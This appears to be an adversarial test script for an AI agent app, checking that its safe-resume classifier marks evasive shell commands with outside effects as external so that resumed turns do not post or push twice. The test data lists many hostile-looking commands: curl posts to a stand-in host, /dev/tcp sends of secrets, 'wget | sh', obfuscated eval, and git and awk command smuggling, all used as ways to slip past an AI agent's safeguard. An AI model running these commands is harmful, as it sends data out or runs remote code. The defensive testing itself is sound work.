// The adversarial check of the effect journal of the safe resume (`docs/architecture/agents.md#safe-turn-resume`).
// The journal must fail closed: a shell command or a tool step with an outside effect must never read as
// `read` or `local`, and an outside step with a doubtful result must never read as `failed`. A wrong
// `read` lets a resumed turn post, push or pay a second time.
// It runs the real classifier, the real journal (`TurnEffects`) and the real decision (`planTurnResume`)
// of the app on commands that hide an outside effect: grouped and attached flags, quoting, nesting,
// here-documents, process substitution, aliases, functions, variables, wrappers, git global options and
// aliases, and programs that run other programs. Each outside command, as a step that started and has
// no result, must stop the task for the person; each one that ended with an error code must stay
// uncertain. A short list of plain reads and local changes must still continue, so the check also sees
// a classifier that calls everything outside.
// `bun scripts/safe-resume-adversarial-e2e.ts`. Writes .openbot-build/safe-resume-adversarial-e2e/report.json.
import { mkdirSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { classifyCommand } from "../src/backend/agent/command-effects";
import { TurnEffects } from "../src/backend/agent/turn-effects";
import { planTurnResume } from "../src/backend/agent/turn-resume";
import type { ThreadItem } from "../src/backend/protocol";

const OUT = resolve(import.meta.dirname, "../.openbot-build/safe-resume-adversarial-e2e");
const HOST = "https://x.test";

/** Commands with an outside effect, in groups. Each one must be `external`. */
const OUTSIDE: Record<string, string[]> = {
  "curl flags": [
    `curl -dfoo=bar ${HOST}/api`,
    `curl -sd foo ${HOST}`,
    `curl -XPOST ${HOST}`,
    `curl -sXPOST ${HOST}`,
    `curl -sX POST ${HOST}`,
    `curl -Ffile=@a.txt ${HOST}`,
    `curl -Tfile.txt ${HOST}`,
    `curl -sSfLd @payload.json ${HOST}`,
    `curl --data-binary @- ${HOST}`,
    `curl -K cfg.txt ${HOST}`,
    "curl smtp://mail.test --mail-rcpt a@b.c -T mail.txt",
    "curl gopher://127.0.0.1:6379/_SET%20a%201",
    `curl $FLAGS ${HOST}`,
  ],
  "gh flags": [
    "gh api repos/o/r/issues -fbody=hi",
    "gh api -Ftitle=x repos/o/r/issues",
    "gh api -XDELETE repos/o/r",
    "gh api --method=PATCH repos/o/r",
    "gh pr merge 12 --squash",
    "gh co 12",
    "gh extension exec foo",
    "gh browse",
  ],
  "awk, sed, find": [
    `awk 'BEGIN{system("curl -d x ${HOST}")}'`,
    `awk '{print | "sh"}' file`,
    `awk 'BEGIN{"curl ${HOST} -d y" | getline r}'`,
    "gawk -f script.awk data",
    `sed -n '1e curl -d x ${HOST}' f`,
    "sed 's/a/b/e' f",
    "sed -e 's/x/y/w /tmp/out' f",
    "sed -f script.sed f",
    `find . -exec curl -d @{} ${HOST} \\;`,
    "find . -execdir sh -c 'git push' \\;",
    `find . -ok curl -T {} ${HOST} \\;`,
  ],
  "runners and wrappers": [
    `xargs curl ${HOST} < urls.txt`,
    "cat ids | xargs -I{} gh issue close {}",
    `echo -d data | xargs curl ${HOST}`,
    "env GIT_SSH_COMMAND='curl -d x h' git fetch",
    "timeout 5 git push",
    "sudo -u root -- git push",
    `nice -n 10 curl -d x ${HOST}`,
    "command git push",
    "npx some-publisher",
    "bunx wrangler deploy",
    "npm run test",
    "npm install",
    "make test",
    `rsync -e 'sh -c "curl -d x h"' a b`,
    "rsync -a src/ host:dst/",
    "tar -cf - . --to-command='curl -d @- h'",
    `tar -I 'sh -c "curl ${HOST}"' -cf a.tar .`,
    "zip -T -TT 'curl -d x h' a.zip f",
    "sort --compress-program=./evil big.txt",
    "rg --pre ./evil pattern",
    `fd -x curl -d @{} ${HOST}`,
    "man -P 'curl -d x h' ls",
    "docker build -t x .",
    "kubectl exec pod -- curl -d x h",
    "terraform plan",
    `wget -e 'post_data=x' ${HOST}`,
    "http POST x.test a=b",
    "python -m pip install x",
    "cargo build",
    `osascript -e 'tell app "Messages" to send "x" to buddy "y"'`,
    `open ${HOST}/unsubscribe`,
    "sqlite3 db '.shell curl -d x h'",
  ],
  "environment, aliases, functions": [
    "GIT_SSH_COMMAND='curl -d x h' git fetch",
    "export GIT_EXTERNAL_DIFF=/tmp/x.sh; git diff",
    "NODE_OPTIONS='--require /tmp/x.js' tsc",
    `alias ls='curl -d x ${HOST}'; ls`,
    `ls() { curl -d x ${HOST}; }; ls`,
    `eval "$(echo Y3VybA== | base64 -d) -d x ${HOST}"`,
    "PAGER='curl -d x h' git log",
  ],
  "variables, quoting, substitution": [
    "$CMD push",
    `"$(echo git)" push origin main`,
    "`echo git` push",
    `echo $(echo $(echo $(echo $(echo $(curl -d x ${HOST})))))`,
    "\\git push",
    `g'i't pu"sh"`,
    "./git status",
    "/tmp/git status",
    `tee >(curl -d @- ${HOST}) < data`,
    "cat data > /dev/tcp/10.0.0.1/80",
    "exec 3<>/dev/tcp/10.0.0.1/80; echo hi >&3",
    `bash -c "bash -c \\"bash -c 'bash -c git\\\\ push'\\""`,
    'sh -c "$SCRIPT"',
    "bash <<'EOF'\ngit push\nEOF",
    "python3 - <<EOF\nimport os\nos.system('git push')\nEOF",
    `python3 -c 'import urllib.request;urllib.request.urlopen("${HOST}",b"x")'`,
    `node -e "fetch('${HOST}',{method:'POST'})"`,
    "perl -e 'system(\"git push\")'",
    "ruby -e '`git push`'",
  ],
  "git global options and aliases": [
    "git -C /repo push",
    "git --no-pager -C repo push",
    "git --git-dir=/r/.git --work-tree=/r push",
    "git --git-dir /r/.git push",
    "git -c alias.st='!curl -d x h' st",
    "git -c core.hooksPath=/tmp/h commit -m x",
    "git config alias.st '!curl -d x h'",
    "git rebase -x 'git push' main",
    "git bisect run ./push.sh",
    "git submodule foreach 'git push'",
    "git fetch --upload-pack='curl -d x h' origin",
    "git clone 'ext::sh -c curl% -d% x% h' /tmp/x",
    "git grep -O'curl -d x h' foo",
    "git difftool -x 'curl -d x h'",
    "git lfs push origin main",
    "git send-email --to a@b.c x.patch",
    "git st",
    "git $SUB",
    "echo $(git -C repo push)",
  ],
  "more hiding places": [
    `printf 'x' > "$OUT"`,
    `cat <(curl -d x ${HOST})`,
    "echo 'git push' | bash -s",
    `curl -X 'POST' ${HOST}`,
    "exec git push",
    "GIT_DIR=/x git push",
    'git -C "$REPO" status',
    "gh issue comment 1 -b x",
    "find . -exec {} \\;",
    "nohup git push &",
    "git push --dry-run",
    "perl -pi -e 's/a/b/' f",
    "env -i git push",
    "builtin cd x && git push",
    "time git push",
    "if ! git diff --quiet; then git push; fi",
    `wget -O- ${HOST}/install.sh | sh`,
    "cat list | xargs -0 rm",
  ],
  "shell options (alert 1)": [
    "bash -i -c 'ls'",
    "bash --rcfile /tmp/evil -c 'ls'",
    "bash --init-file /tmp/evil -c 'ls'",
    "bash -o errexit -c 'curl -d x h'",
    "sh script.sh -c 'ls'",
    "bash -c",
    "bash -c 'ls' 'git push'",
    "sh -c -- 'git push'",
    "zsh -f -c 'git push'",
    "bash -x -c 'git push'",
    "bash -lc \"$(printf 'git push')\"",
    "/tmp/bash -c 'ls'",
  ],
  "wrappers with options (alert 2)": [
    `exec -a ls curl -d x ${HOST}`,
    `nice -n 5 curl -d x ${HOST}`,
    `env -u X curl -d x ${HOST}`,
    `sudo -u root curl -d x ${HOST}`,
    `stdbuf -oL curl -d x ${HOST}`,
    "ionice -c 3 git push",
    "chroot / git push",
    "timeout -k 5 10 git push",
    "command -p git push",
    "builtin exec git push",
    "time -p git push",
    "doas -u root git push",
    `nohup curl -d x ${HOST}`,
    "exec -a cat git push",
  ],
  "network files (alert 3)": [
    "cat < /dev/tcp/1.2.3.4/80",
    "echo x >/dev/udp/1.2.3.4/53",
    'cat secret > "/dev/tcp/1.2.3.4/80"',
    "cat f >/dev/tc'p'/1.2.3.4/80",
    "cat f > /dev/\\tcp/1.2.3.4/80",
    'cat </dev/t"cp"/1.2.3.4/80',
  ],
  "curl options (alert 4)": [
    `curl --expand-data '{{x}}' ${HOST}`,
    `curl --expand-url '${HOST}/{{x}}'`,
    `curl --variable x=1 --expand-data '{{x}}' ${HOST}`,
    `curl --data-raw x ${HOST}`,
    `curl --upload-file f ${HOST}`,
    `curl --request-target x ${HOST}`,
    `curl -X PUT ${HOST}`,
    `curl --json '{}' ${HOST}`,
    `curl --config c ${HOST}`,
    `curl -K- ${HOST}`,
    `curl -H 'X-HTTP-Method-Override: DELETE' ${HOST}`,
    `curl --header 'X-HTTP-Method: PUT' ${HOST}`,
    "curl --url smtp://mail.test",
    "curl ftp://x.test/f -T y",
    "curl telnet://h.test:25",
    "curl dict://h.test:11211/stats",
    `curl --unix-socket /var/run/docker.sock ${HOST}/containers/create`,
    `curl -: ${HOST}`,
  ],
  "HTTPie and xh (alert 5)": [
    "echo '{\"a\":1}' | http x.test",
    "http x.test < body.json",
    "http GET x.test <<< '{\"a\":1}'",
    "xh x.test < data",
    "xhs x.test",
    "https x.test/api < data",
    "http --form x.test a=b",
    "http x.test a:=1",
    "http PUT x.test --ignore-stdin",
    "cat f | xh x.test",
    "http GET x.test --ignore-stdin a=b",
    "http GET x.test --ignore-stdin 'X-HTTP-Method-Override: DELETE'",
  ],
  "awk at signs (alert 6)": [
    "gawk '@load \"filefuncs\"; BEGIN{}'",
    "awk '@include \"evil.awk\"'",
    'gawk \'BEGIN{f="sys" "tem"; @f("git push")}\'',
    'awk \'BEGIN { print "x" | "sh" }\'',
    "awk -e 'BEGIN{system(\"ls\")}'",
    "awk 'BEGIN{cmd=\"curl -d x h\"; cmd | getline}'",
    "mawk -W exec x.awk",
  ],
  "pagers and helpers (alert 7)": [
    "ack --pager='curl -d x h' foo",
    "ack --pager=sh foo",
    "ag --pager 'curl' x",
    "rg --pre 'sh -c \"curl -d x h\"' foo",
    "rg --pre-glob '*' --pre ./x foo",
    "rg -z foo",
    "less '+!curl -d x h' f",
    "more '+!git push' f",
    "git grep --open-files-in-pager='sh -c \"git push\"' foo",
    "LESSOPEN='|curl -d @%s h' less f",
    "grep -r --include=x foo | xargs git push",
    "column -c 80 f | sh",
  ],
  "control flow": [
    "ls; git push",
    "ls && git push || true",
    "ls | tee out | git push",
    "if true; then git push; fi",
    "for r in a b; do git -C $r push; done",
    "case x in x) git push;; esac",
    "(cd repo && git push)",
    "{ git push; }",
  ],
};

/** Plain reads and local changes: they must not read as outside, or no turn would ever continue. */
const SAFE: Record<string, "read" | "local"> = {
  "cat README.md": "read",
  "ls -la": "read",
  "rg -n foo src": "read",
  "git status": "read",
  "git log --oneline -5": "read",
  "git diff HEAD~1": "read",
  "git -C repo status": "read",
  "gh pr list": "read",
  "gh api repos/o/r": "read",
  [`curl -s ${HOST}`]: "read",
  [`curl -o out.json ${HOST}`]: "local",
  "sed -i '' 's/a/b/' f": "local",
  "if [ -f a ]; then cat a; fi": "read",
  "{ ls; }": "read",
  "sed -n '1,5p' f": "read",
  "sed -i 's/a/b/g' f": "local",
  "awk '{print $1}' f": "read",
  "find . -name '*.ts'": "read",
  "find . -name x -delete": "local",
  "mkdir -p a && cp a b": "local",
  "git add -A && git commit -m x": "local",
  "echo hi > out.txt": "local",
  "tsc --noEmit": "local",
  "set -euo pipefail; ls": "read",
  "LANG=C sort f": "read",
  "jq . f": "read",
  "wc -l f": "read",
  'echo "git push"': "read",
  "git -C repo add -A": "local",
  "head -n 20 file": "read",
  "tail -n 50 log.txt": "read",
  'grep -rn "TODO" src': "read",
  "git show HEAD --stat": "read",
  "git branch --show-current": "read",
  "git rev-parse HEAD": "read",
  "gh issue view 12": "read",
  "gh run list --limit 5": "read",
  "sort -u f | uniq -c": "read",
  "printf '%s\\n' a b": "read",
  pwd: "read",
  "date +%Y": "read",
  "which node": "read",
  "touch a": "local",
  "mv a b": "local",
  "git checkout -b feature": "local",
  "bash -lc 'cd /repo && rg -n foo src'": "read",
  [`curl -sSfL ${HOST}/api -H 'Accept: application/json'`]: "read",
  "http GET x.test --ignore-stdin Accept:application/json q==1": "read",
  "git status --porcelain && git diff --stat": "read",
};

interface Row {
  group: string;
  command: string;
  reach: string;
  label: string;
  started: string;
  exited: string;
  passed: boolean;
}

const rows: Row[] = [];

/** The decision of the app for one command step: as a step with no result, and as one that exited with 1. */
function decide(command: string) {
  const journal = new TurnEffects();
  journal.begin("turn");
  const started: ThreadItem = { type: "commandExecution", id: "started", command, status: "inProgress" };
  journal.observe("turn", started, false);
  const asStarted = planTurnResume({ effects: journal.take("turn"), ownCalls: [], resumeUncertain: false });
  journal.begin("turn");
  journal.observe("turn", { ...started, id: "exited", status: "failed", exitCode: 1 }, true);
  const asExited = planTurnResume({ effects: journal.take("turn"), ownCalls: [], resumeUncertain: false });
  return { started: asStarted.kind, exited: asExited.kind };
}

for (const [group, commands] of Object.entries(OUTSIDE)) {
  for (const command of commands) {
    const effect = classifyCommand(command);
    const plan = decide(command);
    rows.push({
      group,
      command,
      reach: effect.reach,
      label: effect.label,
      ...plan,
      passed: effect.reach === "external" && plan.started === "ask" && plan.exited === "ask",
    });
  }
}
for (const [command, expected] of Object.entries(SAFE)) {
  const effect = classifyCommand(command);
  const plan = decide(command);
  rows.push({
    group: "plain",
    command,
    reach: effect.reach,
    label: effect.label,
    ...plan,
    passed: effect.reach === expected && plan.started === "resume" && plan.exited === "resume",
  });
}

/** Tool items of the providers, other than shell commands. */
interface ItemCase {
  name: string;
  events: { item: ThreadItem; completed: boolean }[];
  expected: { reach: string; state: string };
}
const ITEMS: ItemCase[] = [
  {
    name: "a push that exited with an error may have reached the server",
    events: [
      {
        item: { type: "commandExecution", id: "1", command: "git push origin main", status: "failed", exitCode: 128 },
        completed: true,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "a compound command with a post, that exited with an error",
    events: [
      {
        item: {
          type: "commandExecution",
          id: "1",
          command: `curl -d x ${HOST} && false`,
          status: "failed",
          exitCode: 1,
        },
        completed: true,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "a read that exited with an error failed",
    events: [
      {
        item: { type: "commandExecution", id: "1", command: "cat missing", status: "failed", exitCode: 1 },
        completed: true,
      },
    ],
    expected: { reach: "read", state: "failed" },
  },
  {
    name: "an outside MCP call that answered an error",
    events: [
      {
        item: {
          type: "mcpToolCall",
          id: "1",
          server: "slack",
          tool: "post_message",
          status: "failed",
          error: { message: "invalid_blocks" },
        },
        completed: true,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "a call that the person declined did not run",
    events: [
      {
        item: { type: "mcpToolCall", id: "1", server: "slack", tool: "post_message", status: "declined" },
        completed: true,
      },
    ],
    expected: { reach: "external", state: "failed" },
  },
  {
    name: "Codex reads a pipe as a read: the app's own reading wins",
    events: [
      {
        item: {
          type: "commandExecution",
          id: "1",
          command: `cat notes.txt | curl -d @- ${HOST}`,
          status: "inProgress",
          commandActions: [{ type: "read", command: "cat notes.txt", name: "notes.txt", path: "notes.txt" }],
        },
        completed: false,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "an item type that the app does not know is an outside step",
    events: [{ item: { type: "browserAction", id: "1", status: "inProgress" }, completed: false }],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "an ACP fetch can send data",
    events: [
      {
        item: { type: "toolCall", id: "1", name: "webfetch", toolKind: "fetch", status: "in_progress" },
        completed: false,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
  {
    name: "a Claude call that the turn ended before its result",
    events: [
      {
        item: { type: "toolCall", id: "1", name: "mcp__slack__post", status: "completed", unanswered: true },
        completed: true,
      },
    ],
    expected: { reach: "external", state: "uncertain" },
  },
];
const itemRows = ITEMS.map((entry) => {
  const journal = new TurnEffects();
  journal.begin("turn");
  for (const { item, completed } of entry.events) journal.observe("turn", item, completed);
  const [step] = journal.take("turn");
  const actual = { reach: step?.reach ?? "none", state: step?.state ?? "none" };
  return {
    name: entry.name,
    expected: entry.expected,
    actual,
    passed: actual.reach === entry.expected.reach && actual.state === entry.expected.state,
  };
});

const failed = rows.filter((row) => !row.passed);
const failedItems = itemRows.filter((row) => !row.passed);
const report = {
  checkedAt: new Date().toISOString(),
  passed: failed.length === 0 && failedItems.length === 0,
  outsideCommands: rows.filter((row) => row.group !== "plain").length,
  plainCommands: rows.filter((row) => row.group === "plain").length,
  failedCommands: failed,
  items: itemRows,
  rows,
};
mkdirSync(OUT, { recursive: true });
writeFileSync(join(OUT, "report.json"), `${JSON.stringify(report, null, 2)}\n`);
for (const row of failed)
  process.stdout.write(
    `FAIL ${row.group}: ${JSON.stringify(row.command)} -> ${row.reach} (${row.label}), started ${row.started}, exited ${row.exited}\n`,
  );
for (const row of failedItems)
  process.stdout.write(
    `FAIL item: ${row.name} -> ${JSON.stringify(row.actual)}, expected ${JSON.stringify(row.expected)}\n`,
  );
process.stdout.write(
  `${report.passed ? "PASS" : "FAIL"} ${report.outsideCommands} outside commands, ${report.plainCommands} plain commands, ${itemRows.length} tool items: ${join(OUT, "report.json")}\n`,
);
if (!report.passed) process.exitCode = 1;
